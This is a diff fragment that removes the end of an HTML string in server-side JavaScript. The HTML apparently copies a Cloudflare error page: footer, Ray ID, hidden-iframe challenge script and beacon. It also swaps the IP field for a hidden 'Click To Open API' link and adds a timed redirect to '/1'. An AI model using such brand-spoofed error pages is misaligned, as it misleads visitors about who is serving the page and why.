-                <span class="cf-footer-item sm:block sm:mb-1">Ray ID: <strong class="font-semibold">954e985c2d34488e</strong></span>
-                <span class="cf-footer-separator sm:hidden">"</span>
-                <br></br>
-                <span id="cf-footer-item-ip" class="cf-footer-item hidden sm:block sm:mb-1">
-                    Click To Open API:
-                    <button type="button" id="cf-footer-ip-reveal" class="cf-footer-ip-reveal-btn">Click to reveal</button>
-                    <span class="hidden" id="cf-footer-ip">https://kaizen-api.vercel.app/kaizen/home</span>
-                    <span class="cf-footer-separator sm:hidden">"</span>
-                    <br></br>
-                </span>
-                
-                <span class="cf-footer-item sm:block sm:mb-1"><span>Performance & security by</span> <a rel="noopener noreferrer" href="https://www.cloudflare.com/" id="brand_link" target="_blank">Cloudflare</a></span>
-
-                
-                
-            </p>
-        </div><!-- /.error-footer -->
-    </div>
-</div>
-<script>(function(){function d(){var b=a.getElementById("cf-footer-item-ip"),c=a.getElementById("cf-footer-ip-reveal");b&&"classList"in b&&(b.classList.remove("hidden"),c.addEventListener("click",function(){c.classList.add("hidden");a.getElementById("cf-footer-ip").classList.remove("hidden")}))}var a=document;document.addEventListener&&a.addEventListener("DOMContentLoaded",d)})();</script>
-<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9accb5e78e12f5d7',t:'MTc2NTUzNzE0OA=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" data-cf-beacon="{" version":"2024.11.0","token":"b6e02fc0e81a4ea890fc7f86311c307d","r":1,"server_timing":{"name":{"cfcachestatus":true,"cfedge":true,"cfextpri":true,"cfl4":true,"cforigin":true,"cfspeedbrain":true},"location_startswith":null}}"="" crossorigin="anonymous"></script>
-<script> 
-setTimeout(function() {
-    window.location.href = "/1";
-}, 7000);
-</script>
-</body></html>`);
+</html>`);
     }
 });
 
